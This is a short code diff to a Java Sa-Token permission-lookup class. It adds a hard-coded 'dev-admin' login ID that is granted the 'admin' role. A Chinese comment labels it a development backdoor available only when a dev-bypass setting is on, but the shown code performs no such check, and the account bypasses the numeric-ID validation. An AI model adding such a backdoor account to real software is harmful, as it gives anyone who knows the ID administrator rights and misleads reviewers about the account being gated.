@@ -66,6 +66,10 @@ public class SaTokenStpInterfaceImpl implements StpInterface {
         }
 
         String loginIdStr = loginId.toString();
+        // 开发后门账号（仅 app.dev-bypass-enabled=true 时可登录）
+        if ("dev-admin".equals(loginIdStr)) {
+            return List.of("admin");
+        }
         if (!StrUtil.isNumeric(loginIdStr)) {
             return Collections.emptyList();
         }
